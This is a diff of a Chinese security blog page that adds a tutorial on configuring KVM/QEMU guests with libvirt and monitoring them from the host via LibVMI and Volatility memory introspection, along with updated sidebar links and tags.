+&lt;clock offset=&apos;localtime&apos;/&gt;
+&lt;on_poweroff&gt;destroy&lt;/on_poweroff&gt;
+&lt;on_reboot&gt;restart&lt;/on_reboot&gt;
+&lt;on_crash&gt;destroy&lt;/on_crash&gt;
+&lt;devices&gt;
+    &lt;emulator&gt;/usr/bin/qemu&lt;/emulator&gt; &lt;!--先创建好软链接   ln -s /use/local/qemukvm1.1.2/bin/qemu-system-x86_64 /usr/bin/qemu--&gt;
+    &lt;disk type=&apos;file&apos; device=&apos;disk&apos;&gt;
+        &lt;driver name=&apos;qemu&apos; type=&apos;qcow2&apos;/&gt;
+        &lt;source file=&apos;/home/os.img/server12041.img&apos;/&gt;&lt;!--目的镜像路径--&gt;
+        &lt;target dev=&apos;vda&apos; bus=&apos;virtio&apos;/&gt;
+    &lt;/disk&gt;
+
+    &lt;interface type=&apos;bridge&apos;&gt;&lt;!--虚拟机网络连接方式--&gt;
+        &lt;source bridge=&apos;br0&apos;/&gt;&lt;!--当前主机网桥的名称--&gt;
+        &lt;mac address=&quot;00:16:3e:5d:aa:a8&quot;/&gt;&lt;!--为虚拟机分配mac地址，务必唯一，否则dhcp获得同样ip,引起冲突--&gt;
+    &lt;/interface&gt;
+    &lt;input type=&apos;mouse&apos; bus=&apos;ps2&apos;/&gt;
+    &lt;!--vnc方式登录，端口号自动分配，自动加1，可以通过virsh vncdisplay ubuntudemo来查询（实际端口为显示结果+5900）--&gt; 
+    &lt;graphics type=&apos;vnc&apos; port=&apos;-1&apos; autoport=&apos;yes&apos; listen=&apos;0.0.0.0&apos; keymap=&apos;en-us&apos;/&gt;
+&lt;/devices&gt;
+</code></pre><p></p>
+<h3 id="0x04-虚拟机监控Libvmi"><a href="#0x04-虚拟机监控Libvmi" class="headerlink" title="0x04 虚拟机监控Libvmi"></a>0x04 虚拟机监控Libvmi</h3><p>Libvmi是一套能从底层二进制信息重构虚拟机上层语义的C语言API。由于hypervisor(VMM)获取的全是客户机的二进制比特，用户为了从外部（比如宿主机)监控客户机的行为需要理解客户机上层的语义，比如客户机正在运行的进程列表、模块列表等信息，这种二进制到上层语义之间的gap称之为语义鸿沟（semantic gap)，从外部监控客户机的行为称之为虚拟机自省（VM Introspection）。 Libvmi提供的API，能够读取物理内存、虚拟内存、符号表（System.map）、暂停/打开虚拟机、接收内存与寄存器事件的通知等，让用户能很方便的构建插件，来读取进程列表、模块列表等信息（大部分linux原生监控工具都可以通过libvmi来构建). </p>
+<p>Libvmi目前支持Intel,AMD64以及ARM系统结构，支持的虚拟机平台包括XEN与KVM/QEMU，支持的被监控系统类型包括windows和linux. Libvmi从Xenaccess发展而来，要了解其详细原理，可参考论文<a href="https://www.acsac.org/2007/papers/138.pdf" target="_blank" rel="external">Secure and Flexible Monitoring of Virtual Machines</a>以及官方主页<a href="http://libvmi.com/" target="_blank" rel="external">libvmi</a>.</p>
+<p>安装libvmi:</p>
+<p>先安装其依赖的包，注，这里针对KVM/QEMU，关于XEN依赖的包，会有所不同，可参考<a href="http://libvmi.com/docs/gcode-install.html" target="_blank" rel="external">libvmi-installation</a></p>
+<pre><code>apt-get install automake autoconf
+apt-get install libtool
+apt-get install flex bison
+apt-get install check
+</code></pre><p>下载libvmi-0.10.1.tar.gz</p>
+<pre><code>tar xvf libvmi-0.10.1.tar.gz
+</code></pre><p>安装    </p>
+<pre><code>cd libvmi-0.10.1
+./autogen.sh
+./congfigure
+make 
+make install
+ldconfig
+</code></pre><p>libvmi提供了很多plugin examples在/libvmi/examples文件夹中，<br>要运行其中的plugin（比如process-list，列举客户机中进程信息，类似linux的原生ls命令), 首先要找出客户机符号表中的一些偏移信息. libvmi提供了获取偏移信息的工具在/libvmi/tools/linux-offset-finder/ 文件夹中，将其拷贝到虚拟机中，make编译，生成了一个内核模块findoffset.ko，执行insmod findoffset.ko将其插入内核中，<br> 再执行dmesg 将得到的偏移信息，如：</p>
+<pre><code>ostype = &quot;Linux&quot;;
+//sysmap = &quot;/boot/System.map-3.2.0-29-generic&quot;;
+linux_name = 0x470;
+linux_tasks = 0x248;
+linux_mm=0x280;
+linux_pid=0x2bc;
+linux_pgd=0x58;
+</code></pre><p>写进宿主机的/libvmi/etc/libvmi-example.conf中，将libvmi-example.conf拷贝到/etc/libvmi.conf或者\$HOME/etc/libvmi.conf中,注，这里libvmi会在/etc/libvmi.conf或者\$HOME/etc/libvmi.conf中读取偏移信息。另外，这里的sysmap路径是host主机的路径，需要把guest中的System.map文件拷贝到host主机上。(还发现一个问题，虚拟机的名字不能全以数字命名，比如120432,不然在读取libvmi.conf配置文件时会出错).</p>
+<p>之后运行</p>
+<pre><code>/libvmi/examples/process-list ubuntudemo 
+</code></pre><p>这里ubuntudemo是创建的虚拟机名字。以下是列出的部分信息：</p>
+<pre><code>Process listing for VM ubuntudemo (id=3)
+Next list entry is at: ffff88003d638248
+[    0] swapper/0 (struct addr:ffffffff81c0d020)
+[    1] init (struct addr:ffff88003d638000)
+[    2] kthreadd (struct addr:ffff88003d639700)
+[    3] ksoftirqd/0 (struct addr:ffff88003d63ae00)
+[    6] migration/0 (struct addr:ffff88003d658000)
+[    7] watchdog/0 (struct addr:ffff88003d659700)
+[    8] cpuset (struct addr:ffff88003d65ae00)
+[    9] khelper (struct addr:ffff88003d65c500)
+[   10] kdevtmpfs (struct addr:ffff88003d65dc00)
+[   11] netns (struct addr:ffff88003d698000)
+[   12] sync_supers (struct addr:ffff88003d699700)
+</code></pre><p>Libvmi提供的plugins有限，用户可根据需要编写，也可利用取证工具volatlity做更高层次语义的分析。Libvmi支持python绑定，提供了与volatility绑定的接口，具体可见下文。</p>
+<p>###0x05 虚拟机监控Volatility  </p>
+<p>Volatility是一个用python编写的内存分析工具，与libvmi（利用sysystem.map符号表信息)不同的是，volatility利用可执行文件elf中的调试信息（dwarf格式）以及system.map符号表信息来获取更丰富的变量和函数语义。其支持windows， linux以及mac。 文中以Linux为例。</p>
+<p>Get Started:</p>
+<p>下载volatility包</p>
+<pre><code>git clone https://github.com/volatilityfoundation/volatility.git
+</code></pre><p>创建Linux profile</p>
+<p>profile是个zip文件，包含内核数据结构以及调试信息，也就是dwarf文件（volatility称之为vtypes)与system.map的压缩包。</p>
+<p>volatility提供了一个内核模块在/volatility/tools/linux文件夹下来获取vtypes信息，将文件夹内容拷贝到要分析的客户机中，编译make，生成module.dwarf文件。在此之前请确保客户机中以及安装dwarfdump (apt-get install dwarfdump）。之后执行 head module.dwarf，会显示以下内容:</p>
+<pre><code>.debug_info
+
+&lt;0&gt;&lt;0+11&gt;&lt;DW_TAG_compile_unit&gt; DW_AT_producer&lt;GNU C 4.6.3&gt; DW_AT_language&lt;DW_LANG_C89&gt;.....
+
+&lt;1&gt;&lt;45&gt;&lt;DW_TAG_typedef&gt; DW_AT_name&lt;__s8&gt; DW_AT_decl_file&lt;1 include/asm-generic/int-ll64.h&gt;.....
+</code></pre><p>生成</p>
+<p>接着将module.dwarf文件以及/boot/System.map-3.2.0-99-generic 文件（不同系统文件名不同）压缩成一个zip文件，如Ubuntu1204.zip。执行：</p>
+<pre><code>zip volatility/volatility/plugins/overlays/linux/Ubuntu1204.zip volatility/tools/linux/module.dwarf /boot/System.map-3.2.0-99-generic
+</code></pre><p>使用profile</p>
+<pre><code>python vol.py --info | grep Linux 
+</code></pre><p> 这时会显示之前创建的profile名，Linuxubuntu1204x64.</p>
+<pre><code>LinuxUbuntu1204x64    - A Profile for Linux Ubuntu1204 x64 &lt;=== This is the one we just created
+</code></pre><p>绑定libvmi的python接口</p>
+<p>在./volatility/plugins/addrspaces 有针对不同内存快照的物理地址空间，如vmware.py,lime.py，crash.py等。libvmi则提供了pyvmi接口，在/libvmi/tools/pyvmi文件夹中有个pyvmiaddressspace.py文件可供volatility使用，（若需要自己编写python程序，则需要build pyvmi，build过程可参见其中的README文件，若出现编译错误，请确保安装 apt-get install build-essentials, apt-get install python2.7-dev).<br>将pyvmiaddressspace.py文件拷贝至./volatility/plugins/addrespaces文件夹中便可以利用volatility的plugins来分析虚拟机的内存了。以linux_pslist plugin为例，执行：</p>
+<pre><code>python vol.py -l vmi://ubuntudemo --profile=Linuxubuntu1204x64 linux_pslist  
+</code></pre><p>若出现distorm3（反编译库)相关错误，请确保已经安装distorm3</p>
+<pre><code>apt-get install python-pip
+pip install distorm3
+</code></pre><p>绑定pyvmi接口后，volatility所有的plugins都可以用来分析虚拟机内存。 </p>
+<p>完</p>
+<hr>
+<h3 id="References"><a href="#References" class="headerlink" title="References"></a>References</h3><p><a href="http://libvmi.com/" target="_blank" rel="external">Libvmi</a></p>
+<p><a href="http://libvirt.org/" target="_blank" rel="external">Libvirt</a></p>
+<p><a href="https://github.com/volatilityfoundation/volatility/wiki" target="_blank" rel="external">Volatility wiki</a></p>
+<p><a href="https://www.acsac.org/2007/papers/138.pdf" target="_blank" rel="external">Secure and Flexible Monitoring of Virtual Machines</a></p>
+<hr>
+<p><strong>转载本文请务必注明</strong>，文章出处：《<a href="http://www.csyssec.org/20170102/virtualizationcomprehensive/" target="_blank" rel="external">虚拟化环境搭建、管理、监控与分析</a>》与作者信息：<a href="http://weibo.com/diting0x" target="_blank" rel="external">Diting0x</a></p>
+
+      
+    </div>
+    <footer class="entry-meta entry-footer">
+      
+	<span class="ico-folder"></span>
+    <a class="article-category-link" href="/categories/虚拟化综合/">虚拟化综合<span class="article-category-count">1</span></a>
+
+
+      
+  <span class="ico-tags"></span>
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Introspection/">Introspection</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/KVM/">KVM</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Libvmi/">Libvmi</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/QEMU/">QEMU</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Security/">Security</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/System/">System</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Virtualization/">Virtualization</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Volatility/">Volatility</a></li></ul>
 
       
     </footer>
@@ -531,7 +771,7 @@ CSysSec注： 本系列文章来自Diting0x的个人博客，主要介绍内存�
 
   <nav id="page-nav">
     
-    <a class="extend prev" rel="prev" href="/page/11/">上一页</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/10/">10</a><a class="page-number" href="/page/11/">11</a><span class="page-number current">12</span><a class="page-number" href="/page/13/">13</a><a class="page-number" href="/page/14/">14</a><a class="page-number" href="/page/15/">15</a><a class="extend next" rel="next" href="/page/13/">下一页</a>
+    <a class="extend prev" rel="prev" href="/page/11/">上一页</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/10/">10</a><a class="page-number" href="/page/11/">11</a><span class="page-number current">12</span><a class="page-number" href="/page/13/">13</a><a class="page-number" href="/page/14/">14</a><span class="space">&hellip;</span><a class="page-number" href="/page/16/">16</a><a class="extend next" rel="next" href="/page/13/">下一页</a>
   </nav>
 
 </section>
@@ -619,6 +859,90 @@ CSysSec注： 本系列文章来自Diting0x的个人博客，主要介绍内存�
     </ul>
     <div class="widget">
       <ul>
+        
+          <li class="clearfix">
+
+            
+              <div class="widget-entry-summary" style="margin: 0;">
+            
+
+              <h6 style="margin: 0;"><a href="/20170504/unpriviledged-ins/">非特权指令的内核信息泄露</a></h6>
+          <!--  <span>五月 4, 2017</span> -->
+            </div>
+
+          </li>
+        
+          <li class="clearfix">
+
+            
+              <div class="widget-entry-summary" style="margin: 0;">
+            
+
+              <h6 style="margin: 0;"><a href="/20170504/hav-exception/">对硬件虚拟化异常的思考(#VE)</a></h6>
+          <!--  <span>五月 4, 2017</span> -->
+            </div>
+
+          </li>
+        
+          <li class="clearfix">
+
+            
+              <div class="widget-entry-summary" style="margin: 0;">
+            
+
+              <h6 style="margin: 0;"><a href="/20170504/monitoring-syscall/">X86虚拟化技术监控/陷入SYSCALL的另一种方法</a></h6>
+          <!--  <span>五月 4, 2017</span> -->
+            </div>
+
+          </li>
+        
+          <li class="clearfix">
+
+            
+              <div class="widget-entry-summary" style="margin: 0;">
+            
+
+              <h6 style="margin: 0;"><a href="/20170504/vmcs-vmxon/">VT-x技术VMXON与VMCS区域的思考-从安全的角度</a></h6>
+          <!--  <span>五月 4, 2017</span> -->
+            </div>
+
+          </li>
+        
+          <li class="clearfix">
+
+            
+              <div class="widget-entry-summary" style="margin: 0;">
+            
+
+              <h6 style="margin: 0;"><a href="/20170504/monitoring-schduling/">使用硬件虚拟化技术无感监控Windows OS调度事件</a></h6>
+          <!--  <span>五月 4, 2017</span> -->
+            </div>
+
+          </li>
+        
+          <li class="clearfix">
+
+            
+              <div class="widget-entry-summary" style="margin: 0;">
+            
+
+              <h6 style="margin: 0;"><a href="/20170504/mtf/">MTF在基于EPT的客户机物理内存监控中的使用</a></h6>
+          <!--  <span>五月 4, 2017</span> -->
+            </div>
+
+          </li>
+        
+          <li class="clearfix">
+
+            
+              <div class="widget-entry-summary" style="margin: 0;">
+            
+
+              <h6 style="margin: 0;"><a href="/20170504/hardware-security-x86arm/">X86&amp;ARM架构处理器硬件安全特性</a></h6>
+          <!--  <span>五月 4, 2017</span> -->
+            </div>
+
+          </li>
         
           <li class="clearfix">
 
@@ -728,90 +1052,6 @@ CSysSec注： 本系列文章来自Diting0x的个人博客，主要介绍内存�
 
           </li>
         
-          <li class="clearfix">
-
-            
-              <div class="widget-entry-summary" style="margin: 0;">
-            
-
-              <h6 style="margin: 0;"><a href="/20170401/sandbox/">下一代沙盒</a></h6>
-          <!--  <span>四月 1, 2017</span> -->
-            </div>
-
-          </li>
-        
-          <li class="clearfix">
-
-            
-              <div class="widget-entry-summary" style="margin: 0;">
-            
-
-              <h6 style="margin: 0;"><a href="/20170401/unmasking/">揭开内核漏洞利用的神秘面纱</a></h6>
-          <!--  <span>四月 1, 2017</span> -->
-            </div>
-
-          </li>
-        
-          <li class="clearfix">
-
-            
-              <div class="widget-entry-summary" style="margin: 0;">
-            
-
-              <h6 style="margin: 0;"><a href="/20170331/raid/">RAID十年录用论文</a></h6>
-          <!--  <span>三月 31, 2017</span> -->
-            </div>
-
-          </li>
-        
-          <li class="clearfix">
-
-            
-              <div class="widget-entry-summary" style="margin: 0;">
-            
-
-              <h6 style="margin: 0;"><a href="/20170330/kernelmalware/">内核层恶意代码分析</a></h6>
-          <!--  <span>三月 30, 2017</span> -->
-            </div>
-
-          </li>
-        
-          <li class="clearfix">
-
-            
-              <div class="widget-entry-summary" style="margin: 0;">
-            
-
-              <h6 style="margin: 0;"><a href="/20170330/poker/">内核Rootkit行为的多方面解析</a></h6>
-          <!--  <span>三月 30, 2017</span> -->
-            </div>
-
-          </li>
-        
-          <li class="clearfix">
-
-            
-              <div class="widget-entry-summary" style="margin: 0;">
-            
-
-              <h6 style="margin: 0;"><a href="/20170315/valgrind-memcheck/">如何使用Valgrind memcheck工具进行C/C++的内存漏洞检测</a></h6>
-          <!--  <span>三月 15, 2017</span> -->
-            </div>
-
-          </li>
-        
-          <li class="clearfix">
-
-            
-              <div class="widget-entry-summary" style="margin: 0;">
-            
-
-              <h6 style="margin: 0;"><a href="/20170312/phd-expectations-realities/">PhD expectations and reality</a></h6>
-          <!--  <span>三月 12, 2017</span> -->
-            </div>
-
-          </li>
-        
       </ul>
     </div>
   </div>
@@ -822,7 +1062,7 @@ CSysSec注： 本系列文章来自Diting0x的个人博客，主要介绍内存�
   <div class="widget-wrap">
     <h3 class="widget-title">分类导航</h3>
     <div class="widget">
-      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/主流会议/">主流会议</a><span class="category-list-count">4</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/二进制分析/">二进制分析</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/内存安全/">内存安全</a><span class="category-list-count">3</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/博士之路/">博士之路</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/名人课堂/">名人课堂</a><span class="category-list-count">5</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/学术专家/">学术专家</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/安全圈子/">安全圈子</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/恶意代码/">恶意代码</a><span class="category-list-count">9</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/漏洞利用/">漏洞利用</a><span class="category-list-count">14</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/系统内核/">系统内核</a><span class="category-list-count">7</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/虚拟化原理/">虚拟化原理</a><span class="category-list-count">5</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/虚拟化基础/">虚拟化基础</a><span class="category-list-count">6</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/虚拟化综合/">虚拟化综合</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/虚拟机快照/">虚拟机快照</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/虚拟机监控/">虚拟机监控</a><span class="category-list-count">6</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/虚拟机记录与重放/">虚拟机记录与重放</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/虚拟机迁移/">虚拟机迁移</a><span class="category-list-count">3</span></li></ul>
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/主流会议/">主流会议</a><span class="category-list-count">4</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/二进制分析/">二进制分析</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/内存安全/">内存安全</a><span class="category-list-count">3</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/博士之路/">博士之路</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/名人课堂/">名人课堂</a><span class="category-list-count">5</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/学术专家/">学术专家</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/安全圈子/">安全圈子</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/恶意代码/">恶意代码</a><span class="category-list-count">9</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/漏洞利用/">漏洞利用</a><span class="category-list-count">14</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/硬件特性/">硬件特性</a><span class="category-list-count">3</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/硬件虚拟化/">硬件虚拟化</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/系统内核/">系统内核</a><span class="category-list-count">7</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/虚拟化原理/">虚拟化原理</a><span class="category-list-count">5</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/虚拟化基础/">虚拟化基础</a><span class="category-list-count">6</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/虚拟化综合/">虚拟化综合</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/虚拟机快照/">虚拟机快照</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/虚拟机监控/">虚拟机监控</a><span class="category-list-count">9</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/虚拟机记录与重放/">虚拟机记录与重放</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/虚拟机迁移/">虚拟机迁移</a><span class="category-list-count">3</span></li></ul>
     </div>
   </div>
 
@@ -832,7 +1072,7 @@ CSysSec注： 本系列文章来自Diting0x的个人博客，主要介绍内存�
   <div class="widget-wrap">
     <h3 class="widget-title">标签导航</h3>
     <div class="widget tagcloud">
-      <a href="/tags/ASLR/" style="font-size: 11.67px;">ASLR</a> <a href="/tags/ASPLOS/" style="font-size: 10px;">ASPLOS</a> <a href="/tags/Binary/" style="font-size: 10.83px;">Binary</a> <a href="/tags/Compiler/" style="font-size: 10px;">Compiler</a> <a href="/tags/Conference/" style="font-size: 12.5px;">Conference</a> <a href="/tags/Conferences/" style="font-size: 10px;">Conferences</a> <a href="/tags/Course/" style="font-size: 13.33px;">Course</a> <a href="/tags/Exploit/" style="font-size: 17.5px;">Exploit</a> <a href="/tags/Forensics/" style="font-size: 10px;">Forensics</a> <a href="/tags/Heap/" style="font-size: 10.83px;">Heap</a> <a href="/tags/Instrumentation/" style="font-size: 10.83px;">Instrumentation</a> <a href="/tags/Introspection/" style="font-size: 14.17px;">Introspection</a> <a href="/tags/KVM/" style="font-size: 16.67px;">KVM</a> <a href="/tags/Kernel/" style="font-size: 15.83px;">Kernel</a> <a href="/tags/Libvmi/" style="font-size: 13.33px;">Libvmi</a> <a href="/tags/Linux/" style="font-size: 13.33px;">Linux</a> <a href="/tags/Malware/" style="font-size: 15px;">Malware</a> <a href="/tags/Memory/" style="font-size: 13.33px;">Memory</a> <a href="/tags/Migration/" style="font-size: 11.67px;">Migration</a> <a href="/tags/Overflow/" style="font-size: 10.83px;">Overflow</a> <a href="/tags/PIN/" style="font-size: 10px;">PIN</a> <a href="/tags/Paper/" style="font-size: 10.83px;">Paper</a> <a href="/tags/Papers/" style="font-size: 10px;">Papers</a> <a href="/tags/Ph-D/" style="font-size: 10.83px;">Ph.D</a> <a href="/tags/Ppaerwriting/" style="font-size: 10px;">Ppaerwriting</a> <a href="/tags/Professor/" style="font-size: 12.5px;">Professor</a> <a href="/tags/QEMU/" style="font-size: 15.83px;">QEMU</a> <a href="/tags/RE/" style="font-size: 10px;">RE</a> <a href="/tags/ROP/" style="font-size: 10px;">ROP</a> <a href="/tags/RR/" style="font-size: 10px;">RR</a> <a href="/tags/Rootkit/" style="font-size: 11.67px;">Rootkit</a> <a href="/tags/Sandbox/" style="font-size: 10.83px;">Sandbox</a> <a href="/tags/Security/" style="font-size: 20px;">Security</a> <a href="/tags/Shellcode/" style="font-size: 10px;">Shellcode</a> <a href="/tags/Snapshot/" style="font-size: 10px;">Snapshot</a> <a href="/tags/Stack/" style="font-size: 10.83px;">Stack</a> <a href="/tags/System/" style="font-size: 19.17px;">System</a> <a href="/tags/Systemcall/" style="font-size: 11.67px;">Systemcall</a> <a href="/tags/Valgrind/" style="font-size: 10px;">Valgrind</a> <a href="/tags/Virtualization/" style="font-size: 18.33px;">Virtualization</a> <a href="/tags/Virtulization/" style="font-size: 10.83px;">Virtulization</a> <a href="/tags/Volatility/" style="font-size: 10px;">Volatility</a> <a href="/tags/XEN/" style="font-size: 11.67px;">XEN</a>
+      <a href="/tags/ASLR/" style="font-size: 11.82px;">ASLR</a> <a href="/tags/ASPLOS/" style="font-size: 10px;">ASPLOS</a> <a href="/tags/Binary/" style="font-size: 10.91px;">Binary</a> <a href="/tags/Compiler/" style="font-size: 10px;">Compiler</a> <a href="/tags/Conference/" style="font-size: 12.73px;">Conference</a> <a href="/tags/Conferences/" style="font-size: 10px;">Conferences</a> <a href="/tags/Course/" style="font-size: 13.64px;">Course</a> <a href="/tags/Exception/" style="font-size: 10px;">Exception</a> <a href="/tags/Exploit/" style="font-size: 18.18px;">Exploit</a> <a href="/tags/Forensics/" style="font-size: 10px;">Forensics</a> <a href="/tags/HAV/" style="font-size: 12.73px;">HAV</a> <a href="/tags/Hardware/" style="font-size: 11.82px;">Hardware</a> <a href="/tags/Heap/" style="font-size: 10.91px;">Heap</a> <a href="/tags/Instrumentation/" style="font-size: 10.91px;">Instrumentation</a> <a href="/tags/Introspection/" style="font-size: 14.55px;">Introspection</a> <a href="/tags/KVM/" style="font-size: 17.27px;">KVM</a> <a href="/tags/Kernel/" style="font-size: 16.36px;">Kernel</a> <a href="/tags/Libvmi/" style="font-size: 13.64px;">Libvmi</a> <a href="/tags/Linux/" style="font-size: 13.64px;">Linux</a> <a href="/tags/Malware/" style="font-size: 15.45px;">Malware</a> <a href="/tags/Memory/" style="font-size: 13.64px;">Memory</a> <a href="/tags/Migration/" style="font-size: 11.82px;">Migration</a> <a href="/tags/Monitoring/" style="font-size: 11.82px;">Monitoring</a> <a href="/tags/Overflow/" style="font-size: 10.91px;">Overflow</a> <a href="/tags/PIN/" style="font-size: 10px;">PIN</a> <a href="/tags/Paper/" style="font-size: 10.91px;">Paper</a> <a href="/tags/Papers/" style="font-size: 10px;">Papers</a> <a href="/tags/Ph-D/" style="font-size: 10.91px;">Ph.D</a> <a href="/tags/Ppaerwriting/" style="font-size: 10px;">Ppaerwriting</a> <a href="/tags/Professor/" style="font-size: 12.73px;">Professor</a> <a href="/tags/QEMU/" style="font-size: 16.36px;">QEMU</a> <a href="/tags/RE/" style="font-size: 10px;">RE</a> <a href="/tags/ROP/" style="font-size: 10px;">ROP</a> <a href="/tags/RR/" style="font-size: 10px;">RR</a> <a href="/tags/Rootkit/" style="font-size: 11.82px;">Rootkit</a> <a href="/tags/Sandbox/" style="font-size: 10.91px;">Sandbox</a> <a href="/tags/Security/" style="font-size: 20px;">Security</a> <a href="/tags/Shellcode/" style="font-size: 10px;">Shellcode</a> <a href="/tags/Snapshot/" style="font-size: 10px;">Snapshot</a> <a href="/tags/Stack/" style="font-size: 10.91px;">Stack</a> <a href="/tags/Syscall/" style="font-size: 10px;">Syscall</a> <a href="/tags/System/" style="font-size: 19.09px;">System</a> <a href="/tags/Systemcall/" style="font-size: 11.82px;">Systemcall</a> <a href="/tags/VT-x/" style="font-size: 10px;">VT-x</a> <a href="/tags/Valgrind/" style="font-size: 10px;">Valgrind</a> <a href="/tags/Virtualization/" style="font-size: 19.09px;">Virtualization</a> <a href="/tags/Virtulization/" style="font-size: 11.82px;">Virtulization</a> <a href="/tags/Volatility/" style="font-size: 10px;">Volatility</a> <a href="/tags/XEN/" style="font-size: 11.82px;">XEN</a>
     </div>
   </div>
 
